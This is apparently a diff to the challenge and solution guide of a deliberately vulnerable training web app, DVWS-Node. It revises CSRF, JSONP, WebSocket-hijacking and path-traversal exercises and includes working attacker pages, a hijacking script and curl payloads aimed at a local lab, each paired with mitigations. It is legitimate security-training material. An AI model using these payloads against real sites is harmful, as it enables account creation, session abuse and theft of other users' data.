@@ -58,12 +58,12 @@ Damn Vulnerable Web Service (DVWS-Node) is a deliberately insecure web applicati
 38. [Role-Based Profile Data Exposure](#38-role-based-profile-data-exposure)
 39. [Account Recovery IDOR Chain](#39-account-recovery-idor-chain)
 40. [Session Revocation After Password Change](#40-session-revocation-after-password-change)
-41. [Cookie Security and Cross-Site Behavior](#41-cookie-security-and-cross-site-behavior)
-42. [JSONP Cross-Origin Data Exposure](#42-jsonp-cross-origin-data-exposure)
+41. [Cross-Site Request Forgery Through the Login Cookie](#41-cross-site-request-forgery-through-the-login-cookie)
+42. [JSONP Cross-Origin Profile Sharing](#42-jsonp-cross-origin-profile-sharing)
 43. [Cross-Site WebSocket Hijacking](#43-cross-site-websocket-hijacking)
 44. [Server-Side Template Injection](#44-server-side-template-injection)
 45. [Unsafe YAML Supplier Import](#45-unsafe-yaml-supplier-import)
-46. [Cached Monthly Report Path Traversal](#46-cached-monthly-report-path-traversal)
+46. [Cross-Customer Monthly Statement Path Traversal](#46-cross-customer-monthly-statement-path-traversal)
 47. [Notification Preference Mass Assignment](#47-notification-preference-mass-assignment)
 48. [Undocumented TRACE Diagnostics](#48-undocumented-trace-diagnostics)
 49. [Legacy Login Skips Password Verification](#49-legacy-login-skips-password-verification)
@@ -774,7 +774,7 @@ Browsers that perform MIME sniffing may execute the script.
 
 **Endpoint:** `POST /api/v2/admin/create-user`
 
-**Description:** This endpoint reads authentication from an `HttpOnly` cookie (`auth_token`) and accepts `Content-Type: text/plain`, bypassing CORS preflight checks.
+**Description:** This endpoint reads authentication from an `HttpOnly` cookie (`auth_token`) and accepts JSON in a `text/plain` body, so a cross-origin form-like request can create an account without a CORS preflight. Use the HTTPS browser setup in challenge 41 for a browser-realistic demonstration: the HTTPS login cookie uses `SameSite=None; Secure`; the plain HTTP development cookie uses `SameSite=Lax` and may not accompany a cross-site POST.
 
 ### Challenge
 
@@ -788,7 +788,7 @@ Host this HTML on an attacker-controlled page:
 <html>
 <body>
 <script>
-fetch('http://dvws.local/api/v2/admin/create-user', {
+fetch('https://dvws.local:8443/api/v2/admin/create-user', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
@@ -805,6 +805,8 @@ fetch('http://dvws.local/api/v2/admin/create-user', {
 ```
 
 When an admin visits this page, their `auth_token` cookie is included automatically. The endpoint parses JSON from `text/plain` bodies, creating the attacker's admin account.
+
+For a browser-based demonstration, serve the page from `https://attacker.test:8443` with trusted local TLS and allow third-party cookies if the browser blocks them. Challenge 41 walks through the cookie attributes and provides the attacker-origin fixture.
 
 ---
 
@@ -1403,33 +1405,33 @@ Describe or implement recovery-specific defenses: require a random, single-use, 
 
 ## 40. Session Revocation After Password Change
 
-**UI:** Account → Password & sessions
-**Endpoints:** `POST /api/v2/session-lab/secondary-token`, `POST /api/v2/users/change-password`, `GET /api/v2/users/profile`
+**UI:** Account → Password
+**Endpoints:** `POST /api/v2/login`, `POST /api/v2/users/change-password`, `GET /api/v2/users/profile`
 
-**Description:** The Password and sessions section creates an additional JWT, changes the seeded account password, and uses that older token to read the profile. A password change updates the password but does not invalidate previously issued JWTs. The dedicated token endpoint leaves the existing login cookie untouched.
+**Description:** A password change updates the password but does not invalidate JWTs that were issued by ordinary logins before the change.
 
 **Seeded account:** `session-victim` / `Session123!` (reset the database seed to restore it)
 
 ### Challenge
 
-Sign in as the seeded account, open Account → Password & sessions, and create an additional session. Change the password, then verify the additional session. Confirm that it still returns HTTP 200 from the profile endpoint. Then sign out and verify the old password no longer creates a new session.
+Sign in as the seeded account in two separate browser profiles or clients. In one, change the password from **Account → Password**. Use the other session's previously issued token to request the profile and confirm it still returns HTTP 200. Then try to create a new session with the old password; that login should fail.
 
 ### Solution
 
-On Account → Password & sessions, create an additional session while signed in as `session-victim`. Enter `Session123!` as the current password and choose a new password. Select **Verify session** after the password update.
+Log in twice as `session-victim` using `Session123!`, retaining both returned tokens. Change the password in one session from **Account → Password** or by calling the password endpoint with the first token. Then use the second token to request `/api/v2/users/profile`.
 
-The verification request is a `GET /api/v2/users/profile` with the JWT created before the password change in its `Authorization` header. It still receives HTTP 200 even though a new login with `Session123!` fails. The password was changed, but the previously issued JWT was not revoked.
+The second token still receives HTTP 200 even though a new login with `Session123!` fails. The password changed, but the previously issued JWT was not revoked.
 
 ### Defense exercise
 
 Use short-lived access tokens with a revocation strategy, such as a per-user token version checked by the API or refresh-token rotation with revocation. Revoke all sessions after credential recovery or password changes, and verify that both existing and newly requested sessions follow the intended policy.
 
-## 41. Cookie Security and Cross-Site Behavior
+## 41. Cross-Site Request Forgery Through the Login Cookie
 
-**UI:** Account → Session settings
-**Endpoints:** `POST /api/v2/cookie-lab/session`, `POST /api/v2/cookie-lab/action`
+**UI:** Administration → Create user
+**Endpoint:** `POST /api/v2/admin/create-user`
 
-**Description:** Issue a dedicated browser-session cookie with one of three profiles: Standard browser session (`HttpOnly` off, `Secure` off, `SameSite=Lax`), Cross-site compatible session (`HttpOnly`, `Secure`, `SameSite=None`), or Restricted browser session (`HttpOnly`, `Secure`, `SameSite=Strict`). A separate attacker-origin page attempts a harmless state change using browser-managed cookies. This workflow does not alter the app's `auth_token` or the existing CSRF behavior.
+**Description:** This browser exercise uses the normal `auth_token` cookie and the existing cookie-authenticated account-creation flaw. It demonstrates that `HttpOnly` prevents script access to the cookie value but does not stop the browser attaching it to a cross-origin request. On HTTPS, DVWS sets the login cookie to `HttpOnly; Secure; SameSite=None`; browser third-party-cookie settings can still affect whether it is sent.
 
 ### Browser setup
 
@@ -1437,45 +1439,43 @@ Install and trust [mkcert](https://github.com/FiloSottile/mkcert), then from the
 
 ```sh
 mkdir -p certs
-mkcert -cert-file certs/dev-cert.pem -key-file certs/dev-key.pem dvws.local attacker.test
+mkcert -cert-file certs/dev-cert.pem -key-file certs/dev-key.pem dvws.local attacker.test partner.test
 ```
 
-Add `127.0.0.1 dvws.local attacker.test` to your hosts file, then start the local environment with:
+Add `127.0.0.1 dvws.local attacker.test partner.test` to your hosts file, then start the local environment with:
 
 ```sh
 docker compose -f docker-compose.yml -f docker-compose.tls.yml up --build
 ```
 
-Open `https://dvws.local:8443`, sign in, and go to **Account → Session settings**. Issue each profile and compare its `Set-Cookie` response header and `document.cookie` behavior. Then manually open `https://attacker.test:8443/attacker-lab.html?challenge=cookie` in the same browser to compare whether the cross-site action receives the cookie. Modern browser third-party-cookie restrictions can affect the result. The default HTTP setup and ordinary app flows do not require this TLS overlay.
+Open `https://dvws.local:8443` and sign in as `admin` / `letmein`. Inspect the login response's `Set-Cookie` header. Then open `https://attacker.test:8443/attacker-lab.html?challenge=csrf` in the same browser and send the request. Modern browser third-party-cookie restrictions can affect the result. The default HTTP setup remains available for ordinary app flows.
 
 ### Challenge
 
-From **Account → Session settings**, issue each of the three profiles. For each response, record the `HttpOnly`, `Secure`, and `SameSite` attributes and whether `document.cookie` can read `cookie_lab`. With the Cross-site compatible session selected, open the attacker URL above manually and inspect its request to `POST /api/v2/cookie-lab/action`.
+Compare the normal login cookie over HTTP and HTTPS. On HTTP it is `HttpOnly; SameSite=Lax` without `Secure`; on HTTPS it is `HttpOnly; Secure; SameSite=None`. With HTTPS, send the attacker fixture request and inspect the Network panel: it posts JSON as `text/plain` to `/api/v2/admin/create-user`, and the browser supplies `auth_token` if cross-site cookies are permitted. The response is opaque to the attacker page, so verify account creation in DVWS as an administrator.
 
 ### Solution
 
-The Standard browser session is readable by JavaScript because it has no `HttpOnly` attribute; its cookie is `SameSite=Lax` and not marked `Secure`. The Cross-site compatible session sends `HttpOnly; Secure; SameSite=None`, so `document.cookie` cannot read it, but a browser may attach it to the attacker-origin request under the local HTTPS setup. The Restricted browser session sends `HttpOnly; Secure; SameSite=Strict`, so it is not JavaScript-readable and is not sent for that cross-site request.
-
-The attacker fixture is intentionally not linked in the application. Open `https://attacker.test:8443/attacker-lab.html?challenge=cookie` manually after selecting the Cross-site compatible session. If the browser permits third-party cookies, its request changes the isolated cookie-lab notification state without a CSRF token. Browser privacy settings can block this behavior.
+The endpoint accepts the normal login cookie and parses JSON from `text/plain`, allowing the cross-origin request to bypass preflight. Its `Origin` is not checked and there is no CSRF token. `HttpOnly` does not prevent the browser from sending the cookie. The fixture uses `no-cors`, so the attacker page cannot inspect the response; an administrator can verify whether the new account was created.
 
 ### Defense exercise
 
-Keep session cookies `HttpOnly` and `Secure`; choose `SameSite` to match the application's cross-site needs and use a CSRF token or equivalent request validation for state changes. HttpOnly limits script access to the cookie but does not stop the browser sending it automatically.
+Require a CSRF token or equivalent request validation for state-changing endpoints, reject unexpected origins, and avoid accepting authentication from cookies on endpoints designed only for bearer tokens. Keep session cookies `HttpOnly` and `Secure`; use `SameSite` as defense in depth rather than as the only CSRF defense.
 
-## 42. JSONP Cross-Origin Data Exposure
+## 42. JSONP Cross-Origin Profile Sharing
 
 **UI:** Account → External access
-**Endpoints:** `POST /api/v2/jsonp-lab/session`, `GET /api/v2/jsonp-lab/profile?callback=captureProfile`
+**Endpoints:** `GET/PUT /api/v2/users/profile-sharing`, `GET /api/v2/profile-sharing/jsonp?callback=captureProfile`
 
-**Description:** An authenticated account creates a short-lived, HttpOnly cross-site session. The endpoint returns a synthetic profile wrapped in a JavaScript callback. The second-origin fixture includes that endpoint as a script and reads the callback data, demonstrating why JSONP is unsuitable for sensitive responses.
+**Description:** Account → External access lets the account holder select a partner origin and choose which profile fields to share. The settings persist until sharing is revoked. The JSONP endpoint uses the normal `auth_token` cookie and returns only selected fields. It intentionally fails to check that a request came from the configured partner origin, so any origin that can load the authenticated script can read the data.
 
 ### Challenge
 
-Using the local HTTPS setup in challenge 41, sign into DVWS Cloud and select **Account → External access**. Enable the temporary sharing session and compare its `Set-Cookie` response header and `document.cookie` behavior. Then manually open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. Observe that the embedding page receives the callback data even though JavaScript cannot read the HttpOnly cookie directly. Try changing the callback to an invalid value and review the endpoint response.
+Using the local HTTPS setup in challenge 41, sign into DVWS Cloud and select **Account → External access**. Set the partner origin to `https://partner.test:8443`, select one or more fields, and enable sharing. Then open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. The attacker origin is not the configured partner, yet its callback receives the selected fields when the browser sends the `auth_token` cookie. Reload Account to confirm the settings persist, then revoke sharing and reload the attacker fixture; the JSONP request should fail. Browser third-party-cookie restrictions may block the cookie.
 
 ### Solution
 
-The temporary session sends a dedicated `jsonp_lab_session` cookie with `HttpOnly; Secure; SameSite=None`, so `document.cookie` cannot read it. `HttpOnly` does not stop the browser from attaching that cookie to a qualifying request. When the attacker page includes the authenticated endpoint as a cross-origin script, the response is executable JavaScript and invokes the attacker page's callback with the synthetic profile data. This is why an HttpOnly cookie alone does not protect sensitive data exposed through JSONP.
+The configured partner origin is stored as the account holder's intended audience, but the JSONP endpoint never compares it with the request's `Origin`. A script request from `attacker.test` therefore succeeds whenever sharing is enabled and the browser attaches a valid `auth_token` cookie. JSONP executes in the embedding page's context, so the attacker's callback can read the selected profile fields. The callback name is validated to prevent JavaScript injection, but that does not enforce the intended origin. Revoking sharing disables the response.
 
 ### Defense exercise
 
@@ -1493,6 +1493,26 @@ Do not expose sensitive data through JSONP. Return JSON and apply a narrowly sco
 Use the local HTTPS setup in challenge 41, sign into `https://dvws.local:8443`, and open Account → Notifications so the normal login cookie is present. From a page served at `https://attacker.test:8443`, run `new WebSocket('wss://dvws.local:8443/ws/notifications')` in the console and review the `snapshot` message. Send `JSON.stringify({ type: 'mark-read', id: '<notification id>' })` to alter an inbox item. Compare the handshake Origin with the missing Origin validation. This requires trusted local TLS and the two host mappings.
 
 Requests without a valid `auth_token` cookie are rejected with HTTP 401. On HTTPS the login cookie is `HttpOnly; Secure; SameSite=None`, allowing the browser to attach it during the cross-origin WebSocket handshake. The normal HTTP development server instead uses `HttpOnly; SameSite=Lax` without `Secure`; Account still works same-origin, but that setup does not claim a browser-faithful cross-origin exploit.
+
+### Solution
+
+From the attacker page's browser console, open the socket and print the snapshot:
+
+```js
+const socket = new WebSocket('wss://dvws.local:8443/ws/notifications');
+socket.onmessage = (event) => {
+  const message = JSON.parse(event.data);
+  console.log(message);
+  if (message.type === 'snapshot') {
+    const unread = message.notifications.find((notification) => !notification.read);
+    if (unread) socket.send(JSON.stringify({ type: 'mark-read', id: unread._id }));
+  }
+};
+```
+
+The `snapshot` contains the signed-in user's notifications. If an unread item exists, the script sends its ID and the server replies with a successful `read` message; Account → Notifications then shows that item as read. In the browser's Network panel, inspect the WebSocket handshake: its `Origin` is `https://attacker.test:8443`, while the browser supplies the DVWS `auth_token` cookie for the `dvws.local` connection. The attacker script cannot read the HttpOnly cookie; it does not need to, because the browser attaches it automatically. The server checks that cookie but accepts the handshake without checking `Origin`, which lets the attacker page use the victim's authenticated socket.
+
+**Mitigation:** Validate the WebSocket handshake `Origin` against an explicit allowlist before upgrading, and reject unexpected origins. Keep authentication and per-user authorization checks as well; cookie flags alone do not prevent cross-site WebSocket hijacking.
 
 ## 44. Server-Side Template Injection
 
@@ -1552,29 +1572,38 @@ The example is non-destructive, but the vulnerable parser can execute arbitrary 
 
 **Mitigation:** Use a data-only YAML schema, reject custom executable tags, validate each imported field, and never invoke functions supplied by an uploaded document.
 
-## 46. Cached Monthly Report Path Traversal
+## 46. Cross-Customer Monthly Statement Path Traversal
 
 **Endpoint:** `GET /api/v2/reports/monthly?period=YYYY-MM`
 
-**Scenario:** An authenticated finance user requests a monthly exchange-rate report from a file cache. The API expects a year-month value but uses it directly to form the cache file path.
+**Scenario:** An authenticated workspace user requests a monthly account statement built from their profile and Resource Store orders. Statements are cached by account and month. The report endpoint appends the caller-supplied `period` to that account's cache directory without checking that the resolved path stays inside it.
 
 ### Challenge
 
-Retrieve the ordinary September report, then use path traversal to read the adjacent synthetic support summary outside the cache directory.
+Sign in as `recovery-victim` and place a Resource Store order so the account has statement data. Request the current month's report to generate its cached statement. Then sign in as `test` and use path traversal in `period` to read the victim's statement. Compare the victim's ordinary report response with the response returned to `test`.
 
 ### Solution
 
 ```sh
-curl 'http://dvws.local/api/v2/reports/monthly?period=2026-09' \
-  -H 'Authorization: Bearer <token>'
+PERIOD=$(date +%Y-%m)
 
-curl 'http://dvws.local/api/v2/reports/monthly?period=..%2Finternal%2Fsupport-summary' \
-  -H 'Authorization: Bearer <token>'
+curl -X POST 'http://dvws.local/api/v2/resource-store/orders' \
+  -H 'Authorization: Bearer <recovery-victim-token>' \
+  -H 'Content-Type: application/json' \
+  -d '{"itemId":"api-monitor","quantity":2}'
+
+curl --get 'http://dvws.local/api/v2/reports/monthly' \
+  -H 'Authorization: Bearer <recovery-victim-token>' \
+  --data-urlencode "period=$PERIOD"
+
+curl --get 'http://dvws.local/api/v2/reports/monthly' \
+  -H 'Authorization: Bearer <test-token>' \
+  --data-urlencode "period=../recovery-victim/$PERIOD"
 ```
 
-The second response includes `classification: "internal training data"`. The file is a synthetic fixture in this repository; no host files or real customer records are involved.
+The final response contains the victim account's email address and monthly order details, including the two API Monitor units. The report was generated from DVWS account and Resource Store data; the cache file is stored under the victim's account directory in the server's temporary report cache.
 
-**Mitigation:** Validate the period against a strict format, resolve the candidate path, and verify it remains beneath the cache directory before reading it.
+**Mitigation:** Validate `period` as a strict year-month value, resolve the final path, and verify it remains beneath the authenticated user's report directory before reading it. Keep authenticated statements private in shared caches.
 
 ## 47. Notification Preference Mass Assignment
 
@@ -1857,14 +1886,14 @@ The shared auth middleware accepts the forged token. A `200` response confirms a
 | Category | Endpoints |
 |----------|-----------|
 | **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
-| **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/session-lab/secondary-token`, `/api/v2/users/change-password` |
+| **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/users/change-password` |
 | **JWT Key Handling** | Shared auth middleware (`jku` trust); `/api/v2/jwt-key-lab/kid/profile` |
 | **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/users/profile`, `/api/v2/account-recovery/lookup`, `/graphql` (userLogin, userSearchByUsername, userFindbyId) |
 | **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
 | **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/account-recovery/lookup`, `/api/v2/account-recovery/reset` |
 | **SSRF** | `/xmlrpc` (dvws.CheckUptime) |
 | **RCE** | `/api/v2/export` (deserialization), `/api/v2/sysinfo/:cmd` (command injection) |
-| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`, `/api/v2/cookie-lab/action`), XSS (various), JSONP (`/api/v2/jsonp-lab/profile`) |
+| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`), XSS (various), JSONP (`/api/v2/profile-sharing/jsonp`) |
 | **WebSocket** | Cross-Site WebSocket Hijacking (`/ws/notifications`) |
 | **Resource Consumption** | `/api/v2/reports/activity` |
 | **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure, alias amplification) |
